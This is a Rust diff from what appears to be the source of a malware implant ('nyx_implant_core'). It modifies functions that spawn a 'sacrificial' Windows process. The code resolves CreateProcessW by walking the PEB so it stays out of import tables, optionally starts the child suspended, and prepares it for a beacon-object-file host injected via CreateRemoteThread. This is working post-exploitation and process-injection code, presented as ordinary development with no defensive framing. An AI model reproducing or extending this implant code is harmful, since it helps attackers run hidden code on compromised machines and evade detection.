@@ -151,8 +151,8 @@ impl Drop for SacrificialProcess {
 /// (and terminates a never-resumed process).
 pub unsafe fn create_sacrificial(spawn_to: &str) -> Result<SacrificialProcess, &'static str> {
     let create_proc = unsafe { create_sacrificial_resolve() }?;
-    let (mut cmd, mut si, mut pi) = create_sacrificial_buffers(spawn_to);
-    unsafe { create_sacrificial_spawn(create_proc, &mut cmd, &mut si, &mut pi, 0, true) }
+    let (mut cmd, app, mut si, mut pi) = create_sacrificial_buffers(spawn_to);
+    unsafe { create_sacrificial_spawn(create_proc, &mut cmd, &app, &mut si, &mut pi, 0, true) }
 }
 
 /// Create the sacrificial process `spawn_to` RUNNING (not suspended). The FLS
@@ -170,8 +170,8 @@ pub unsafe fn create_sacrificial_running(
     spawn_to: &str,
 ) -> Result<SacrificialProcess, &'static str> {
     let create_proc = unsafe { create_sacrificial_resolve() }?;
-    let (mut cmd, mut si, mut pi) = create_sacrificial_buffers(spawn_to);
-    unsafe { create_sacrificial_spawn(create_proc, &mut cmd, &mut si, &mut pi, 0, false) }
+    let (mut cmd, app, mut si, mut pi) = create_sacrificial_buffers(spawn_to);
+    unsafe { create_sacrificial_spawn(create_proc, &mut cmd, &app, &mut si, &mut pi, 0, false) }
 }
 
 /// `CreateProcessW` (kernel32) — resolved via PEB walk for the sacrificial
@@ -200,18 +200,26 @@ unsafe fn create_sacrificial_resolve() -> Result<CreateProcessW, &'static str> {
 /// plus the zeroed STARTUPINFOW / PROCESS_INFORMATION buffers.
 fn create_sacrificial_buffers(
     spawn_to: &str,
-) -> (nyx_implant_core::heap::Vec<u16>, [u8; 104], [u8; 24]) {
+) -> (
+    nyx_implant_core::heap::Vec<u16>,
+    nyx_implant_core::heap::Vec<u16>,
+    [u8; 104],
+    [u8; 24],
+) {
     // Build a UTF-16 command line from spawn_to (mutable buffer Win32 wants).
     let mut cmd = nyx_implant_core::heap::vec![0u16; spawn_to.len() + 1];
     for (i, b) in spawn_to.as_bytes().iter().enumerate() {
         cmd[i] = *b as u16;
     }
+    // Separate buffer for lpApplicationName: CreateProcessW mutates
+    // lpCommandLine, so the two pointers must not alias.
+    let app = cmd.clone();
     // STARTUPINFOW: cb=104 (size of STARTUPINFOW on x64), rest zeroed.
     let mut si = [0u8; 104];
     si[0..4].copy_from_slice(&104u32.to_le_bytes());
     // PROCESS_INFORMATION: two handles + pid + tid = 24 bytes on x64.
     let pi = [0u8; 24];
-    (cmd, si, pi)
+    (cmd, app, si, pi)
 }
 
 /// Spawn `spawn_to` suspended (CREATE_SUSPENDED, no environment, no current
@@ -222,6 +230,7 @@ fn create_sacrificial_buffers(
 unsafe fn create_sacrificial_spawn(
     create_proc: CreateProcessW,
     cmd: &mut [u16],
+    app: &[u16],
     si: &mut [u8; 104],
     pi: &mut [u8; 24],
     inherit: i32,
@@ -230,9 +239,17 @@ unsafe fn create_sacrificial_spawn(
     // CREATE_SUSPENDED (0x4) when requested (B3 runs the child normally —
     // kernel32 + loader must initialize so bof-host's PEB walk works).
     const CREATE_SUSPENDED: u32 = 0x4;
+    // Absolute paths (contain `\`) go in lpApplicationName so SearchPath
+    // cannot pick a different image. Bare names like notepad.exe stay
+    // command-line-only (PATH search).
+    let app_name = if app.iter().any(|&c| c == b'\\' as u16) {
+        app.as_ptr()
+    } else {
+        core::ptr::null()
+    };
     let ok = unsafe {
         create_proc(
-            core::ptr::null(),     // lpApplicationName (use cmd line)
+            app_name,
             cmd.as_mut_ptr(),      // lpCommandLine
             core::ptr::null_mut(), // lpProcessAttributes
             core::ptr::null_mut(), // lpThreadAttributes
@@ -369,11 +386,13 @@ pub unsafe fn create_sacrificial_isolated(
     let (create_pipe, set_handle_info, close) = unsafe { isolated_pipe_resolve()? };
     let (pipe_read, pipe_write) = unsafe { isolated_pipe(create_pipe, set_handle_info)? };
     let pipe_write_val = pipe_write as usize;
-    let (mut cmd, mut si, mut pi) = create_sacrificial_buffers(spawn_to);
+    let (mut cmd, app, mut si, mut pi) = create_sacrificial_buffers(spawn_to);
     isolated_startup(&mut si, pipe_write);
     // NOT suspended: the child must load normally (kernel32 + Ldr) before
     // bof-host runs via CreateRemoteThread.
-    match unsafe { create_sacrificial_spawn(create_proc, &mut cmd, &mut si, &mut pi, 1, false) } {
+    match unsafe {
+        create_sacrificial_spawn(create_proc, &mut cmd, &app, &mut si, &mut pi, 1, false)
+    } {
         Ok(proc) => {
             close(pipe_write); // child holds its own inherited writer
             Ok((proc, pipe_read, pipe_write_val))
